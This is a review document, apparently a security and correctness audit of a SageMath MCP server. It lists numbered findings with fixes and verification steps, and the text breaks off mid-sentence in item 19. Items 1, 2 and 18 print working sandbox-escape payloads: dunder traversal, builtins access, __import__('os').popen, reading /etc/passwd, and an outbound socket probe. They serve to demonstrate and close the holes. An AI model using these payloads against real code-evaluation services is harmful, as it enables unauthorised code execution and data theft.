# Review actions — 2026-08-13

Findings from a review of the 50-commit range `2eac01e..345906d`, with a
suggested fix and a way to verify each. Runtime claims were measured against a
real SageMath 10.9 worker where relevant; protocol, session and persistence
claims were reproduced with MCP clients or focused worker/manager probes. The
full Sage-backed suite passed, which is why the missing regression cases are
called out explicitly below.

Severity is about consequence, not effort.

**Second review round.** A re-check found items 1, 2, 3, 11 and 15 partial and
item 1 still exploitable. What was missing in each is recorded in that item's
section, under a "second round" heading, along with what closed it. Items 10,
12, 13, 14, 16 and 17 were confirmed complete.

| # | Severity | Item | Status |
|---|----------|------|--------|
| 1 | **Critical** | The AST validator is bypassable in at least seven ways | **done** |
| 2 | **Critical** | README documents protections that do not exist | **done** |
| 3 | High | The container, not the validator, is the real boundary — and it is not hardened | **done** |
| 4 | Medium | `server.py` is 2147 lines and the least-covered module | **done** (split; coverage deferred) |
| 5 | Medium | Two release paths cannot be exercised before a tag push | **done** |
| 6 | Low | 104 dependencies, with pip-audit now blocking | **done** |
| 7 | Low | Distribution: Smithery and Glama listings | **partly done** (Glama listed; Smithery needs owner sign-in) |
| 8 | Low | Codex still routes two questions to `evaluate_sage` | **closed** (model choice, not a defect) |
| 9 | Low | Jupyter kernel `debug_request` question left unresolved | **answered** (no bypass; caveats recorded) |
| 10 | **Critical** | Response caching breaks state and isolation across MCP clients | **done** |
| 11 | High | Cancelling a named workspace restarts the default workspace | **done** |
| 12 | High | The large-integer corruption guard accepts corrupted JSON integers | **done** |
| 13 | Medium | `evaluate_sage_streaming` emits output only after completion | **done** |
| 14 | Medium | Idle culling discards journals instead of persisting them | **done** |
| 15 | Medium | Sanitized journal filenames collide | **done** |
| 16 | Medium | Specialized tools cannot select named workspaces | **done** |
| 17 | Medium | Version bumps leave `server.json` stale | **done** |
| 18 | **Critical** | Four specialized tools interpolate caller strings into trusted, `sage_eval`-enabled code | **done** |
| 19 | High | Interrupting an idle worker wedges it and loses the state it claims to preserve | **done** |
| 20 | High | Integer results above 2^53 are silently corrupted by JavaScript-based clients | **done** |
| 21 | **Critical** | Persisted specialized-tool state can never be restored | **done** |
| 22 | High | Exact-integer inputs unguarded on two tools; `/health` never registered; `is_convex` always true | **done** |
| 23 | High | Nightly leaked every provider key to each CLI, and stayed green when registration failed | **done** |
| 24 | **Critical** | Forbidden functions reachable through attribute chains; `load`/`attach` never listed | **done** |
| 25 | **Critical** | Sage's own helpers and CAS interfaces execute code, compile, fetch and run shells | **done** |
| 26 | Medium | `uv.lock` stale and unverified; compose published on every interface | **done** |
| 27 | **Critical** | Imports re-create everything the namespace scrub removed | **done** |
| 28 | High | Object methods (`.dump`, `.save_image`, `.export_jmol`) write arbitrary files | **done** |
| 29 | Medium | A timeout escaped as a bare `TimeoutError`, unrecorded | **done** |

---

## 1. The AST validator is bypassable — **critical** — DONE

**Reopened once, now closed.** The first fix rejected forbidden names only where
they were the direct target of an `ast.Call`, so aliasing walked through both raw
`evaluate_sage` and the specialised tools: `f = open` then `f("/etc/passwd")`,
`(lambda f=open: f("/etc/passwd").readline())()` and `[open][0](...)` all
succeeded against real SageMath — the lambda payload returned the first line of
`/etc/passwd` via `calculate_expression`. Two changes closed it:

1. `security.py` now rejects a forbidden name in **any load context**, not just
   call position.
2. `_sage_worker.py` builds user code's `__builtins__` without the dangerous
   names at all, so a missed spelling has nothing to reach. `__import__` stays —
   Sage imports lazily during ordinary mathematics — and is unreachable anyway
   because no dunder can be named.

Eleven aliasing payloads were added to `tests/test_security_bypass.py` (38 tests
total), each confirmed failing before the fix and passing after, and re-verified
against real Sage rather than the pure-Python shim.

**Fixed.** An eighth bypass was found while fixing the seven listed: every
specialised tool `sage_eval`s its caller's expression, so
`calculate_expression("__import__('os').getuid()")` returned the container uid.
The validator only ever saw a string constant, which means the sandbox had never
covered the 30 helper tools at all — only `evaluate_sage`.

Caller fragments are now validated as expressions before being embedded, and
server-generated snippets run under a separate trusted policy that permits
`sage_eval` and nothing else extra. All eight vectors are blocked against the
real worker, and 368 integration tests pass, so nothing legitimate broke.

Original finding follows.


### What is wrong

At least seven vectors were confirmed against the real worker. UID probes
returned the container uid (`1001`), and the builtins-subscript probe wrote a
file despite the documented `open()` block:

| Vector | Payload |
|--------|---------|
| `os` is in the namespace | `os.getuid()` |
| `getattr` is not forbidden | `getattr(os, 'getuid')()` |
| Dunder traversal | `().__class__.__bases__[0].__subclasses__()` → reaches `subprocess.Popen` |
| Builtins by attribute | `__builtins__.__import__('os').getuid()` |
| Builtins by subscript | `__builtins__['open']('/tmp/probe', 'w').write('escaped')` |
| String eval after validation | `sage_eval("__import__('os').getuid()")` |
| Attribute chain | `sage.misc.temporary_file.os.getuid()` |

The root cause is in `SecurityPolicy`: an attribute is blocked only when the
**parent and the attribute name both** appear in their respective lists. So
`os.system` is blocked while `os.listdir`, `os.environ`, `os.rename` and
`os.chmod` are not. `security.py` has 99% line coverage, which is a reminder
that coverage measures lines executed, not threats modelled.

### Suggested fix

In `security.py`, in rough order of value for effort:

1. **Block dunder attribute access outright.** Reject any `ast.Attribute` whose
   name starts and ends with `__` (`__class__`, `__globals__`, `__subclasses__`,
   `__bases__`, `__builtins__`, `__mro__`). This closes traversal and builtins
   access in one rule and is the single highest-value change.
2. **Change the parent/attribute rule from AND to parent alone.** If the parent
   is `os`, `sys`, `subprocess`, `shutil`, `socket` or `pathlib`, block every
   attribute rather than eighteen named ones. `forbidden_attribute_names` then
   becomes a second, independent rule for bare calls.
3. **Forbid the indirection helpers**: add `getattr`, `setattr`, `delattr`,
   `sage_eval`, `preparse` and `eval_expr`-style entry points to
   `forbidden_call_names`. `sage_eval` is the sharpest of these because it
   evaluates a string *after* AST validation has passed, which defeats the
   entire design.
4. **Walk attribute chains.** Resolve `a.b.c.d` to its root `ast.Name` instead of
   only checking one level, so `sage.misc.temporary_file.os` is caught.
5. **Purge the namespace in `_sage_worker.py`.** After `from sage.all import *`,
   delete `os`, `sys`, `subprocess`, `shutil`, `socket` and `importlib` from the
   execution globals. Defence in depth: even if a rule is missed, the object is
   not reachable by name.

Beware of over-blocking: `polynomial_ring_operation` and friends legitimately
touch Sage internals, and `_sage_worker` itself uses `io` and `base64`. The
integration suite (342 tests) is the regression net for that.

### How to verify

Write `tests/test_security_bypass.py` with the seven payloads above, each asserting
`SecurityViolation`. They must fail against today's code before the fix lands —
that is the only proof the tests are testing anything. Then run the full
integration suite to confirm nothing legitimate broke.

---

## 2. README documents protections that do not exist — **critical** — DONE

**Reopened with item 1, now closed.** While the validator only checked call
position, the README's claim that `open()` and the indirection helpers were
blocked overstated enforcement — and the consistency test agreed with it, because
it too probed only the `name('x')` spelling. The table now states that forbidden
names are rejected wherever they are *read*, documents the restricted worker
builtins, and the test probes alias assignment, `lambda` defaults and container
literals for every documented name.

**Fixed.** The table now states what is enforced, and says plainly that the
validator is defence in depth rather than a boundary. Two tests keep it honest:
one asserts every documented protection is enforced, the other that no enforced
module is missing from the docs. The second failed immediately on `builtins`.

Original finding follows.


### What is wrong

`README.md` under "Security Sandbox" claims `subprocess.*`, `pathlib.*` and
`socket.*` are blocked. Checked directly against the validator:

```
ALLOWED  subprocess.run(['id'])
ALLOWED  subprocess.Popen(['id'])
ALLOWED  pathlib.Path('/etc/passwd').read_text()
ALLOWED  socket.socket()
```

`README.md` also states the validator blocks "dangerous operations regardless of
the tool used". A reader deploying on that basis is misinformed, and the sandbox
is the project's stated differentiator against every competitor surveyed.

### Suggested fix

Correct the claims **now**, before item 1 is finished, because a wrong security
claim is worse than a weak sandbox honestly described. Specifically:

- Replace the wildcard rows with what is actually enforced, generated from
  `SecurityPolicy` rather than written by hand where possible.
- State plainly that the validator is **defence in depth against accidents, not
  a boundary against adversarial code**, and that the container is the security
  boundary.
- Keep the honesty comparison in mind: `sympy-mcp` states outright that it allows
  arbitrary code execution. Being accurate is not a competitive loss.

### How to verify

Extend `tests/test_generated_code_lint.py`, which already asserts that every
documented example is exercised, with a check that every module named in the
README security table is actually rejected by `SECURITY_POLICY`. That makes this
class of drift impossible to reintroduce silently.

---

## 3. The container is the real boundary, and it is not hardened — high — DONE

**Second round.** The first pass added `cap_drop`, `no-new-privileges`,
`pids_limit`, `mem_limit` and the read-only mount, but left the root filesystem
writable, the Helm chart without a read-only root or resource limits, and three
documents still recommending `chown -R 1001:1001 .`. Now: `read_only: true` with
tmpfs for `/tmp` and `/home/sage/.sage` (verified by running Sage, a real
evaluation and a plot under it — without the tmpfs mounts the container fails
with "No usable temporary directory found", which is how they were sized);
`readOnlyRootFilesystem`, `emptyDir` scratch and default CPU/memory
requests/limits in the chart; and the blanket-chown guidance replaced in
INSTALLATION.md, DISTRIBUTION.md and USAGE.md with "only a dedicated persistence
volume should be writable". The README no longer claims Helm is "equivalent" —
it lists what the chart sets and names the one gap (`pids_limit` has no chart
equivalent).

**Fixed.** The compose stack now mounts the checkout read-only, drops all
capabilities, sets no-new-privileges, and bounds pids and memory. Verified by
bringing the hardened stack up and running the smoke script against it.

Original finding follows.


### What is wrong

Measured from inside the sandbox after an escape:

| Reachable | Evidence |
|-----------|----------|
| All environment variables | `len(os.environ)` → 71 |
| The host-mounted repository | `os.listdir('/workspace')` → 44 entries, contents readable |
| The network | `socket.connect_ex(('1.1.1.1', 443))` → 0 |

Writing to the host mount failed with `PermissionError` — but only because the
container runs as uid 1001 while the host files are owned by 1000. That is an
accident, not a control, and **`DISTRIBUTION.md`, `INSTALLATION.md` and
`USAGE.md` instruct users to run `chown -R 1001:1001`**, which removes it.

### Suggested fix

- Mount the workspace **read-only** in `docker-compose.yml` (`./:/workspace:ro`)
  and give the worker a separate writable scratch volume if it needs one.
- Add `cap_drop: [ALL]`, `security_opt: [no-new-privileges:true]`, and a
  `pids_limit` and `mem_limit` to bound a runaway computation.
- Consider `network_mode: none` for deployments that do not need it, and document
  the trade-off for those that do.
- Revisit the `chown` guidance so it does not silently grant write access to the
  host checkout.
- Mirror the same constraints in the Helm chart's `securityContext`.

### How to verify

Re-run the reachability payloads above against the hardened compose stack and
assert each is denied. Worth adding as a slow, opt-in test alongside the CLI
suites rather than in the default CI path.

---

## 4. `server.py` is 2147 lines and the least-covered module — medium — DONE (split)

**Split.** 2327 lines at the time of the work, now 162. The FastMCP object and
lifecycle moved to `app.py`, the settings and session manager to `runtime.py`,
the code-building machinery to `codegen.py`, and the 37 tools into seven domain
modules under `tools/`. Plan and decisions: `REFACTOR_SERVER_SPLIT.md`.

The public surface is unchanged and that was checked mechanically rather than by
reading: `tests/test_tool_inventory.py` snapshots every tool name, its full JSON
input schema and its description, and it was proved non-vacuous first by
shortening one description and renaming one tool.

Two things worth knowing for next time. The generated-code lint resolved
`server.py` by path, so after the move it would have passed while inspecting a
file with no tools in it — the discovery floor added for item 18 caught that
(`assert 0 >= 30`). And the 37 `monkeypatch.setattr(server, "SESSION_MANAGER")`
sites were retargeted rather than converted to the planned fixture: several
depend on their own settings, which one shared fixture would have flattened.

**Coverage was deliberately not touched**, so any test change is provably a move
rather than a fix. The uncovered clusters are unchanged and still open: the
per-distribution mean/variance branches, the `_check_matrix`/`_exact_int`
rejection paths, the `_validated_expression` fallbacks and two geometry error
paths.

`server.py` is 63% of all source and sits at 88% coverage against 93% overall;
every one of the 37 tools lives in it.

**Suggested fix:** split by domain into a `tools/` package — `calculus.py`,
`algebra.py`, `discrete.py`, `plotting.py`, `sessions.py` — each registering its
tools against the shared `mcp` instance, leaving `server.py` as composition root,
middleware and `/health`. Do it in one mechanical move with no behaviour change,
so the diff is reviewable and the test suite is the proof.

**Verify:** tool count stays 37, `test_generated_code_lint.py` still finds every
documented example, and all 342 tests stay green against SageMath 10.9.

---

## 5. Two release paths cannot be exercised before a tag push — medium — DONE

**Fixed.** `release.yml` accepts a `workflow_dispatch` that exercises the
registry and release jobs without publishing: the manifest is parsed, OIDC login
is performed, and the release notes are rendered but nothing is created. PyPI is
unreachable from a dispatch.

The tag ordering is preserved deliberately. Both jobs still declare
`needs: [publish]` and gate on `needs.publish.result == 'success'` for tags, so a
failed upload still cannot leave a release announcing a version that was never
shipped. Changing `needs` to `[build]` would have been simpler and would have
silently removed that guarantee.

Original finding follows.


`release.yml`'s `mcp-registry` and `github-release` jobs only run on `v*` tags,
so their first execution is a real release. The registry job additionally depends
on the `mcp-name` marker being present in the **published** PyPI description,
which only becomes true from the next release onwards.

**Suggested fix:** add a `workflow_dispatch` input that runs both jobs in a dry
run — `mcp-publisher` with a validate-only flag, and `gh release create --draft`
against a throwaway tag — so the paths are exercised deliberately rather than
discovered during a release.

**Verify:** trigger the dispatch manually and confirm both jobs pass without
publishing anything.

---

## 6. 104 dependencies, with pip-audit now blocking — low — DONE

**Fixed.** `audit.yml` runs the same audit against `main` every Monday and opens
(or comments on) a single issue when something is found, so an advisory arrives
on its own schedule instead of turning a contributor's unrelated pull request
red with no change of theirs to blame. CI stays blocking.

Original finding follows.


Making `pip-audit` blocking was right, and it immediately cleared 32 findings.
The consequence is that a new upstream advisory now turns CI red with no change
to this repository, and `fastmcp` pulls a large tree.

**Suggested fix:** accept the tradeoff, but add a scheduled weekly job that runs
the audit against `main` so an advisory surfaces on its own schedule rather than
in whoever's PR happens to be open. Keep the blocking behaviour.

---

## 7. Distribution: Smithery and Glama listings — low — PARTLY DONE

**The half that lives in git is done.** `smithery.yaml` declares the stdio launch
command and the four settings worth exposing, and it names the `sagemath-mcp`
entry point that `pyproject.toml` actually defines.

**The remaining half needs an account and cannot be automated from here.**

- **Smithery**: connect the repository at <https://smithery.ai/new> with an
  account that owns `XBP-Europe/sagemath-mcp`. It reads `smithery.yaml` from the
  default branch.
- **Glama**: **listed, claim pending.** It auto-indexed the repository, and
  `https://glama.ai/api/mcp/v1/servers?query=sagemath` returns
  `SageMath MCP Server` pointing at `XBP-Europe/sagemath-mcp`. Nothing to submit;
  sign in at <https://glama.ai> with a GitHub account that owns the repository to
  *claim* it and edit the listing. It ranks on repository metadata, which is why
  the description mattering being stale (it advertised 33 tools against the
  actual 37) was worth correcting.

Note that SageMath is a large runtime and is not bundled: the Smithery command
assumes `sage` is on PATH, so the container image remains the better route for
callers who do not have it. Worth saying on the listing rather than leaving
people to discover it.

**The listed settings were changed for this.** `smithery.yaml` offered
`securityEnabled`, which turns the AST policy off. After items 24 and 25 —
`cython()`, `sh()`, `gp('system(...)')` — advertising that switch on a public
listing invites someone to disable the one thing standing between a caller and
those, on a server whose whole purpose is evaluating code. It is gone from the
listing; `SAGEMATH_MCP_SECURITY_ENABLED` still exists for anyone who means it.
`persistSessions` and `persistDir` took its place, which is what a hosted user
actually needs to configure.

Original finding follows.


The remaining Tier 1 item from the competitive survey. `fermat-mcp` carries both
badges and has 20 stars against our 12 with a far smaller tool surface.

**Suggested fix:** submit to both. Cheap, and the registry work is already done.

---

## 8. Codex still routes two questions to `evaluate_sage` — accepted

`ext-nt-next-prime` and `ext-comb-partitions` did not move after the description
rewrite or the `int | str` annotation. Both look like questions that map onto a
Sage one-liner the model is confident writing, which a description cannot argue
it out of. Four of six did move.

**Closed on evidence.** Re-measured after the description work, across all three
CLIs:

| case | claude | gemini | codex |
|------|--------|--------|-------|
| `ext-nt-next-prime` | `evaluate_sage` | `number_theory_operation` | `number_theory_operation` |
| `ext-comb-partitions` | `combinatorics_operation` | `combinatorics_operation` | `evaluate_sage` |

Every case passes. The routing is not a fixed defect: it varies by model and
between runs, and the two "holdouts" are no longer the same two. Codex now picks
the specialised tool for `next_prime` and not for `partitions`, which is the
opposite of what was recorded.

The remaining lever would be structural — not exposing `evaluate_sage`, or
client-side tool-choice hints — and neither is worth the cost for cases that
answer correctly. `evaluate_sage` is also the escape hatch for everything the
other 36 tools do not cover, so hiding it has a real price.

---

## 9. Jupyter kernel `debug_request` question — deferred

`prototypes/jupyter_transport/FINDINGS.md` recommends against adopting the kernel
transport. One question was left open: `debugpy` is present in Sage's Python, and
whether a crafted `debug_request` can evaluate outside `do_execute` was never
established.

**Answered on 2026-08-14** by `prototypes/jupyter_transport/debug_probe.py`, run
against the guarded kernel with debugpy 1.8.20 and ipykernel 7.2.0 present.

`debug_request` does reach the debugger -- `debugInfo` answers `success: True` --
and the kernel **does advertise `debugger`**, which the original note had wrong.
But `initialize` returns `success: False`, `attach` comes back empty, the session
reports `isStarted: False`, and `evaluate` produces no result. The same payload
sent as an `execute_request` is refused with `SecurityViolation`.

**No bypass, with two caveats.** The surface is advertised and reachable, so a
future ipykernel that starts the session more readily reopens it; and a negative
result says this sequence did not evaluate, not that none can. If the transport is
ever adopted, disable the debugger explicitly rather than relying on it failing to
start.

The rich-display argument also weakened on inspection: `szeider/mcp-sage`, the
project that did adopt the kernel transport, reads only `text/plain` and never
harvests `image/png` -- so it is not using the one feature that would justify the
move. It also runs the stock kernel with no validation of any kind.

---

## 10. Response caching breaks state and client isolation — **critical** — DONE

**Fixed.** Tool-call, resource and prompt caching are disabled; only the list_*
catalogues stay cached, since those are identical for every caller. Three tests
cover it and all three fail with FastMCP's defaults restored.

Original finding follows.


### What is wrong

`server.py` installs `ResponseCachingMiddleware()` with its defaults. In FastMCP
3.4.7 those defaults cache every successful tool call for one hour. A tool cache
key contains the tool name, arguments and authorization identity, but not the MCP
session id; unauthenticated clients share one anonymous partition.

Reproduced with two independent in-process MCP clients:

1. Client A called `evaluate_sage(code="cache_probe = 41")`.
2. Client B made the identical call. It returned from the cache in 0.14 ms and
   never executed in B's worker.
3. Client B then evaluated `cache_probe` and received `NameError`.

The reverse failure is a confidentiality problem: a state-dependent expression
can return client A's value to client B. Repeated `reset`, `cancel`, `start` and
`stop` calls can also be skipped while returning a cached success response.
Session and monitoring resources are similarly stale under the default resource
cache.

### Suggested fix

- Disable `tools/call` caching globally. If caching is kept, allowlist only tools
  that are proven pure and include every state input in their arguments.
- Disable caching for session and monitoring resources, or explicitly invalidate
  them after every state transition.
- Treat authentication partitioning as additional isolation, not a replacement
  for including the MCP session in stateful behavior.

### How to verify

Add an end-to-end test using two unauthenticated `fastmcp.Client` instances. Make
the same assignment in each client and verify that both workers actually acquire
the variable. Add repeated reset/cancel tests and verify that each invocation
changes state rather than returning a cached response.

---

## 11. Named-workspace cancellation targets the wrong worker — high — DONE

**Second round.** Evaluation used `_read_response`, but `reset()` still read the
next line unconditionally, so it consumed a cancelled evaluation's response and
reported "Failed to reset Sage session" for a reset that had worked. `reset()`
now matches ids too, an id-less line is no longer accepted as any request's
answer, and cancellation cleanup moved into `SageSession.evaluate` so streaming
and the specialised tools stop abandoning a running computation. The strict id
rule needed a bound — waiting for a matching id is unbounded when the peer
repeats itself, and a stubbed worker spun there until the process ran out of
memory — so it gives up after 64 non-matching lines.

**Fixed.** The workspace key is computed once and used for both `get` and
cancellation. Worker responses are now matched to their request id, and stale
lines from a cancelled computation are discarded rather than returned as the
next request's result.

Original finding follows.


### What is wrong

`evaluate_sage` correctly obtains a named workspace with
`key_for(ctx.session_id, session)`, but its `CancelledError` handler calls
`SESSION_MANAGER.cancel(ctx.session_id)`. Cancelling work in `curves` therefore
restarts the default workspace, losing unrelated default state, while the
`curves` worker continues running.

When that worker eventually writes the cancelled request's response, the next
request can consume it because `SageSession.evaluate` decodes the response but
does not verify that its `id` matches the request. The result can therefore be
from the previous, cancelled computation.

### Suggested fix

Compute the workspace key once and use it for both `get` and cancellation. Also
validate every worker response id before accepting it; a mismatched response
should be drained or treated as a protocol error, never returned as the current
request's result.

### How to verify

Start work in both `default` and `curves`, cancel a long `curves` request, and
assert that default state survives, the named worker is actually restarted, and
the next named evaluation returns its own result. Run this against the real Sage
worker as well as the pure-Python shim.

---

## 12. The large-integer corruption guard does not guard JSON integers — high — DONE

**Fixed.** Any numeric argument above 2^53 is refused whether it arrives as int
or float, because the server cannot tell an exact value from one a JavaScript
client already rounded. Decimal strings remain exact at any size. Verified
against real Sage: the string form returns the correct prime for 10^30 and the
rounded integer from the review is rejected.

Original finding follows.


### What is wrong

`_exact_int` rejects a `float` above `2^53`, but accepts any Python `int`.
JavaScript clients round the value before serialization and commonly emit the
rounded decimal digits as a JSON integer. Python then parses those digits as an
`int`, so the float-only branch is never reached.

The exact corrupted value named in the tool description,
`1000000000000000019884624838656`, was accepted unchanged by `_exact_int`.
`next_prime` can therefore still return a plausible but incorrect answer for the
originally intended `10^30`.

### Suggested fix

Reject every numeric argument whose absolute value exceeds `2^53`, whether it
arrives as `int` or `float`, and require the documented decimal-string form.
Keep booleans and non-integral floats rejected.

### How to verify

Test through the MCP schema rather than calling `_exact_int` directly. Send the
known rounded JSON integer and assert a `ToolError` requesting a decimal string;
send the same exact digits as a string and assert they are accepted without
alteration.

---

## 13. The streaming tool buffers all output — medium — DONE

**Fixed by implementing streaming, not by renaming it.** The worker now emits a
`{"type": "stdout"}` event per completed line, and the session dispatches those
while still awaiting the final response. The integration test prints a marker,
computes for several seconds, prints a second marker, and asserts the first event
arrives well before completion — it fails against the old buffered code.

Original finding follows.


### What is wrong

`evaluate_sage_streaming` awaits `session.evaluate()` before it splits and emits
`worker_result.stdout`. The worker protocol returns one JSON response only after
execution finishes, so a caller receives no intermediate output during a long
computation. The tool, README and usage guide currently promise real-time,
line-by-line output that does not occur.

### Suggested fix

Extend the worker protocol with stdout event messages and have `SageSession`
dispatch those events while waiting for the final response. If that protocol
work is not planned, rename the tool and documentation to describe post-run
progress replay rather than streaming.

### How to verify

Run code that prints one marker, performs a multi-second computation, then prints
a second marker. Assert that the first progress event arrives before computation
completion and before the second marker.

---

## 14. Idle culling bypasses persistence — medium — DONE

**Fixed.** `cull_idle` saves each journal before terminating the worker, with the
same guarded handling as manager shutdown. Test: a session with a zero TTL is
populated, culled, then re-obtained and its variable restored.

Original finding follows.


### What is wrong

`SageSessionManager.shutdown` and `stop` save journals, but `cull_idle` removes
stale sessions and calls `session.shutdown()` directly. With persistence enabled,
the normal 15-minute idle lifecycle therefore discards state. A focused manager
probe with a populated journal produced no file after culling.

### Suggested fix

Save each journal before shutting down a culled worker, using the same guarded
logic as manager shutdown. Prefer an atomic temporary-file-and-rename write so a
crash cannot leave half a JSON journal.

### How to verify

Create a persistent session with a one-second TTL, assign a variable, cull it,
then obtain the same session again and assert that the variable is restored.

---

## 15. Journal filename sanitization is not injective — medium — DONE

**Fixed.** The filename is now a readable prefix plus a SHA-256 digest of the
full key, so distinct workspaces cannot share a file. Tests cover slashes,
question marks, colons, spaces, backslashes, Unicode, existing underscores and
over-long names.

**Follow-up:** the rename orphaned every journal written by an earlier version,
including plain default sessions. `existing_journal_path()` falls back to the two
previous filename schemes when no digest-named journal exists, and
`save_journal()` retires the legacy file once state has been written under the
new name, so the two schemes cannot diverge. Covered by a lookup test and an
end-to-end restore-and-migrate test.

Original finding follows.


### What is wrong

`_persist_path` replaces every character outside `[A-Za-z0-9._-]` with `_`.
Distinct named workspaces such as `a/b` and `a?b` consequently map to the same
`client__a_b.journal.json` path. One workspace can overwrite another's journal
and later restore the wrong code into its namespace.

### Suggested fix

Use an injective encoding of the full storage key, such as URL-safe base64, or a
readable prefix plus a cryptographic hash. Do not rely on lossy character
replacement for identity.

### How to verify

Parameterize workspace names containing slashes, question marks, colons,
Unicode and existing underscores. Assert that every distinct key has a distinct
path and that each journal restores only its own variables.

---

## 16. Specialized tools cannot use named workspaces — medium — DONE

**Fixed, and the README claim narrowed to the truth.** All 30 worker-backed
tools now take the validated `session` argument and resolve it through
`key_for`, so a call can be routed to a chosen workspace.

Worth recording what that does and does not buy: the specialised tools evaluate
their input through `sage_eval` against Sage's own globals, so they have never
been able to see variables defined by `evaluate_sage` — confirmed against the
default session, so this is by design rather than a regression. `session`
therefore selects *which worker runs the call*, which matters for isolation,
interrupt and cancel. The README now says exactly that instead of implying
shared state.

Original finding follows.


### What is wrong

The README says every tool that touches session state accepts the optional
`session` argument. In practice, specialized tools such as
`calculate_expression`, `solve_equation` and `graph_operation` expose no such
argument and always call `SESSION_MANAGER.get(ctx.session_id)`. Named workspaces
are therefore usable only through raw evaluation and the few session-management
tools that were updated.

### Suggested fix

Add the same validated `session` argument to every helper that uses a worker and
resolve it through `key_for`. If specialized helpers are intentionally stateless,
run them in an explicitly stateless worker path and narrow the README claim.

### How to verify

Define different values in `default` and a named workspace, invoke representative
tools from every domain with `session=...`, and assert both routing and isolation.
Also inspect the published MCP schemas to ensure the argument is exposed.

---

## 17. Version bumps leave the registry manifest stale — medium — DONE

**Fixed.** `bump_version.py` updates both `server.json` fields. Three tests: all
declared versions agree today, the real script against temporary copies leaves
nothing stale, and `--dry-run` changes nothing.

Original finding follows.


### What is wrong

`scripts/bump_version.py::_write_all` updates `pyproject.toml`, the package
fallback version and both Helm chart fields, but not the two version fields in
`server.json`. The release workflow patches the manifest only in its temporary
checkout, so the version committed by the bump pull request remains stale.

### Suggested fix

Teach the bump script to update `server.json.version` and
`server.json.packages[0].version`, then make a version-consistency test compare all
package, chart and registry fields.

### How to verify

Run the bump script against temporary copies and assert that every version-bearing
file changes to the same value while `--dry-run` changes none of them.

---

## Not a project issue

---

## 18. Four specialized tools interpolate caller strings into trusted code — **critical** — DONE

**Fixed.** All four parameters now pass through `_validated_expression` before
interpolation — a constructor call is an expression, so no bespoke allowlist was
needed. Variable names go through a new `_validated_identifier`, applied at the
`_sage_prelude` chokepoint rather than at its 33 call sites, which also closes the
quoted-interpolation route for `ring_vars` and `variables`.

A structural guard in `test_generated_code_lint.py` now fails if any str-typed
parameter reaches generated code without a gate, so the next tool cannot
reintroduce this. It was proved by reverting one fix and watching it fail.

**Removing `__import__` from the worker namespace was tried and reverted.** It is
the escalation step, so denying it looked right, and 11 of 14 representative
operations kept working — but `polynomial_ring_operation` then failed with
`KeyError('__import__')` raised inside `sage.libs.singular`'s polynomial string
formatting. That is Cython internals, not caller code. The namespace backstop
cannot cover this name; the gate on every string reaching a trusted template is
the defence.

Verified: 6 attacks blocked and 7 legitimate calls intact against real SageMath
10.9, with a side-effect payload rather than a return value, because several
sinks raise a type error only after the payload has run. 354 unit, 430
integration.

Original finding follows.

Found by an external review on 2026-08-13, after items 1-3 were reported closed,
and reproduced here end to end against real SageMath 10.9.

### What is wrong

`_evaluate_structured` runs generated code with `trusted=True`, and
`trusted_policy()` deliberately re-permits `sage_eval`, `preparse` and
`sage_input` because every helper template is built on `sage_eval`. Its own
docstring states the condition that makes that safe:

> That is only safe because the caller-supplied fragments interpolated into the
> template are validated separately by `_validated_expression` before they get
> here.

That validation lives inside `_encode_literal`. Four parameters never call it and
are interpolated raw:

| Tool | Parameter | Line |
|------|-----------|------|
| `graph_operation` | `graph` (both the named-graph arguments and the literal branch) | `server.py:1849`, `1852` |
| `group_operation` | `group` | `server.py:1923` |
| `coding_theory_operation` | `code_type` | `server.py:2029` |
| `polynomial_ring_operation` | `base_ring` | `server.py:2148` |

The chain: the raw string lands in generated code -> that code is validated under
the trusted policy, which permits `sage_eval` -> `sage_eval("...")` evaluates a
string at runtime, invisible to the AST validator -> inside that string
`__import__` is reachable, because it was deliberately kept in the worker
namespace for Sage's lazy imports. That reasoning ("caller code cannot name a
dunder") holds for AST-validated code and fails for a runtime-evaluated string.

Measured through the public tool path, via `graph_operation`:

| Probe | Result |
|-------|--------|
| `__import__("os").getuid()` | `1001`, the container uid |
| read `/etc/passwd` | 942 bytes |
| `__import__("os").popen("id").read()` | 48 bytes |
| `socket().connect_ex(("1.1.1.1", 443))` | `0` — outbound connection succeeded |
| write `/tmp/pwned` | file present on disk |

All 13 string parameters a static scan flagged were probed individually with a
side-effect payload, so a type mismatch at the sink could not hide execution.
Exactly four executed. The other nine are protected by `_encode_literal` and
returned "Rejected by the security policy". Two further parameters
(`polynomial_ring_operation.ring_vars`, `vector_calculus_operation.variables`)
are interpolated inside quotes; escape attempts died on syntax errors, so they
are unproven rather than shown safe.

Why the earlier work missed it: every regression test added for items 1 and 2
drives `evaluate_sage` or `calculate_expression`, and both validate. These four
tools are precisely the ones that never call `_encode_literal`. The aliasing
fixes are irrelevant here — the payload is a string literal the validator never
parses.

The container bounds this but does not close it: under the compose deployment
the write lands in tmpfs on a read-only root filesystem, yet the outbound socket
succeeded, so exfiltration does not need the filesystem.

### Suggested fix

1. Validate all four parameters before interpolation. `_validated_expression` is
   the wrong gate as-is for `SymmetricGroup(5)` or `HammingCode(GF(2), 3)`: those
   are constructor calls, so allow a call whose callee is a bare name from a
   per-tool allowlist and whose arguments are literals or nested allowed calls,
   and reject everything else.
2. Reconsider keeping `__import__` in the worker namespace. It was retained for
   Sage's lazy imports on the argument that no caller can name a dunder; a
   runtime-evaluated string can. If it must stay, `sage_eval` needs a restricted
   globals mapping rather than the session namespace.
3. Treat "interpolated into a trusted template" as the property to test, not
   "reachable from evaluate_sage".

### How to verify

A test per affected parameter, each asserting the payload is rejected, and each
confirmed to FAIL against today's code first. Use a side-effect payload (write a
file, then assert it is absent) rather than a return value, since several sinks
raise a type error after the payload has already run. Then a structural test that
walks `server.py` and fails if any caller-supplied string reaches generated code
without passing through `_encode_literal` or an equivalent gate, so the next tool
added cannot reintroduce this.

---

## 19. Interrupting an idle worker wedges it — high — DONE

Found reviewing the split branch, and reproduced independently by a test in that
same branch timing out against real SageMath.

### What was wrong

`SageSession.interrupt()` signalled whenever a worker process was alive, without
knowing whether it was computing anything. An idle worker is blocked in
`readline()`, where a SIGINT has no computation to abort. The worker's handler
swallows it and continues — under the pure-Python worker. Under real Sage the
worker could not answer the next request at all: that evaluation hit the 30s
timeout and the worker was restarted, destroying exactly the namespace the
interrupt exists to protect. The tool reported "state preserved" throughout.

Only the Sage suite could see it, which is why the pure-Python unit tests had
asserted the broken behaviour as correct (`assert await session.interrupt() is
True` on an idle session).

### Fix

The session tracks the request id currently executing and `interrupt()` returns
False without signalling when there is none. The tool then reports "No running
